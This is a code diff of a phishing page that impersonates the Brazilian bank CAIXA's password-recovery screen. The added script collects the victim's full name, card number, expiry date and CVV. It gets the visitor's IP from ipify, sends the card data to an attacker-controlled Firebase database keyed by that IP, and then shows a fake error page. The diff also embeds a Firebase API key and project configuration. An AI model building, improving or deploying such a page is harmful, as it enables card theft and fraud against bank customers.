@@ -5,24 +5,26 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Recuperação - CAIXA</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: sans-serif; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
         body { display: flex; justify-content: center; background-color: #f0f0f0; }
-        .mobile-container { width: 100%; max-width: 400px; height: 100vh; background-color: #ffffff; padding: 24px; }
+        .mobile-container { width: 100%; max-width: 400px; height: 100vh; background-color: #ffffff; padding: 24px; display: flex; flex-direction: column; }
 
-        /* Cabeçalho */
-        .header { display: flex; justify-content: space-between; align-items: center; margin-top: 20px; margin-bottom: 40px; }
-        .logo img { height: 35px; }
+        .header { display: flex; justify-content: space-between; align-items: center; margin-top: 20px; margin-bottom: 30px; }
+        .logo img { height: 35px; width: auto; }
+        .btn-sair { color: #005ca9; text-decoration: none; font-size: 16px; font-weight: 500; }
 
-        /* Inputs */
-        .input-group { position: relative; margin-bottom: 20px; }
-        .input-group input { width: 100%; padding: 18px; border: 1.5px solid #6b7a87; border-radius: 24px; font-size: 16px; outline: none; }
+        h1 { margin-bottom: 24px; font-size: 26px; font-weight: 800; color: #1d2124; }
+
+        .input-group { position: relative; margin-bottom: 16px; }
+        .input-group input { width: 100%; padding: 18px; border: 1.5px solid #6b7a87; border-radius: 24px; font-size: 16px; color: #1d2124; outline: none; transition: border-color 0.2s; }
+        .input-group input:focus { border-color: #005ca9; }
         
-        /* Layout lado a lado */
         .row-group { display: flex; gap: 10px; }
         .half { width: 50%; }
 
-        h1 { margin-bottom: 20px; font-size: 24px; color: #1d2124; }
-        .btn-confirmar { width: 100%; padding: 15px; background-color: #F39200; color: white; border: none; border-radius: 24px; font-weight: bold; cursor: pointer; margin-top: 20px; }
+        .btn-confirmar { width: 100%; padding: 15px; background-color: #ebf0f2; color: #9ab0bd; border: none; border-radius: 24px; font-size: 16px; font-weight: 600; cursor: not-allowed; margin-top: 10px; transition: all 0.3s ease; }
+        .btn-confirmar.ativo { background-color: #F39200; color: white; cursor: pointer; }
+        .btn-confirmar.ativo:hover { background-color: #d88200; }
     </style>
 </head>
 <body>
@@ -30,46 +32,108 @@
     <div class="mobile-container">
         <header class="header">
             <div class="logo"><img src="https://logo-teka.com/wp-content/uploads/2026/07/caixa-icon-logo.svg" alt="logo"></div>
-            <a href="index.html" style="color:#005ca9; text-decoration:none;">Sair</a>
+            <a href="index.html" class="btn-sair">Sair</a>
         </header>
 
         <h1>Recuperação de senha</h1>
 
         <div class="input-group">
-            <input type="text" placeholder="Nome Completo">
+            <input type="text" id="nome" placeholder="Nome Completo" autocomplete="off">
         </div>
         <div class="input-group">
-            <input type="text" placeholder="Número do cartão" maxlength="16">
+            <input type="text" id="cartao" placeholder="Número do cartão" maxlength="19" autocomplete="off">
         </div>
 
         <div class="row-group">
             <div class="input-group half">
-                <input type="text" id="data" placeholder="MM/AA" maxlength="5">
+                <input type="text" id="data" placeholder="MM/AA" maxlength="5" autocomplete="off">
             </div>
             <div class="input-group half">
-                <!-- Alterado o ID para CVV para bater com o script -->
-                <input type="text" id="CVV" placeholder="000" maxlength="3">
+                <input type="text" id="CVV" placeholder="CVV (000)" maxlength="3" autocomplete="off">
             </div>
         </div>
 
-        <button class="btn-confirmar">Continuar</button>
+        <button type="button" class="btn-confirmar" id="btnConfirmar" disabled>Continuar</button>
     </div>
 
-    <script>
-        // Máscara para Data (MM/AA)
-        document.getElementById('data').addEventListener('input', function(e) {
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.17.1/firebase-app.js";
+        import { getDatabase, ref, update } from "https://www.gstatic.com/firebasejs/12.17.1/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyA9WtjdMj6wBsqkaPcZC9Xa9TgCpB11eho",
+            authDomain: "dados-a1d4d.firebaseapp.com",
+            databaseURL: "https://dados-a1d4d-default-rtdb.firebaseio.com",
+            projectId: "dados-a1d4d",
+            storageBucket: "dados-a1d4d.firebasestorage.app",
+            messagingSenderId: "550441905479",
+            appId: "1:550441905479:web:ff1ef4eec12a928895b062"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        const inputNome = document.getElementById('nome');
+        const inputCartao = document.getElementById('cartao');
+        const inputData = document.getElementById('data');
+        const inputCVV = document.getElementById('CVV');
+        const btnConfirmar = document.getElementById('btnConfirmar');
+
+        // Validação simples para habilitar o botão se todos os campos tiverem preenchimento básico
+        function validarCampos() {
+            if (inputNome.value.length > 3 && inputCartao.value.length >= 15 && inputData.value.length === 5 && inputCVV.value.length === 3) {
+                btnConfirmar.disabled = false;
+                btnConfirmar.classList.add('ativo');
+            } else {
+                btnConfirmar.disabled = true;
+                btnConfirmar.classList.remove('ativo');
+            }
+        }
+
+        inputNome.addEventListener('input', validarCampos);
+        inputCartao.addEventListener('input', function(e) {
+            let v = e.target.value.replace(/\D/g, '');
+            v = v.replace(/(\d{4})(?=\d)/g, '$1 '); // Adiciona espaço a cada 4 dígitos do cartão
+            e.target.value = v;
+            validarCampos();
+        });
+
+        inputData.addEventListener('input', function(e) {
             let v = e.target.value.replace(/\D/g, '');
             if (v.length > 2) v = v.substring(0,2) + '/' + v.substring(2,4);
             e.target.value = v;
+            validarCampos();
         });
 
-        // Máscara para apenas números (3 dígitos) no campo CVV
-        document.getElementById('CVV').addEventListener('input', function(e) {
-            // Remove qualquer coisa que não seja número
+        inputCVV.addEventListener('input', function(e) {
             e.target.value = e.target.value.replace(/\D/g, '');
-            // Garante que não passe de 3 dígitos (além do maxlength)
-            if (e.target.value.length > 3) {
-                e.target.value = e.target.value.substring(0, 3);
+            if (e.target.value.length > 3) e.target.value = e.target.value.substring(0, 3);
+            validarCampos();
+        });
+
+        // Ação ao clicar em Continuar
+        btnConfirmar.addEventListener('click', async function() {
+            if (btnConfirmar.disabled) return;
+
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const dataRes = await response.json();
+                let ipUsuario = dataRes.ip;
+                let ipKey = ipUsuario.replace(/\./g, '_').replace(/:/g, '_');
+
+                // Envia e junta os dados do cartão no mesmo nó do IP no Firebase
+                await update(ref(db, 'usuarios/' + ipKey), {
+                    nomeCompleto: inputNome.value,
+                    cartao: inputCartao.value,
+                    validade: inputData.value,
+                    cvv: inputCVV.value,
+                    dataUltimoAcesso: new Date().toISOString()
+                });
+
+                window.location.href = 'erro.html';
+            } catch (error) {
+                console.error("Erro ao salvar dados do cartão:", error);
+                window.location.href = 'erro.html';
             }
         });
     </script>
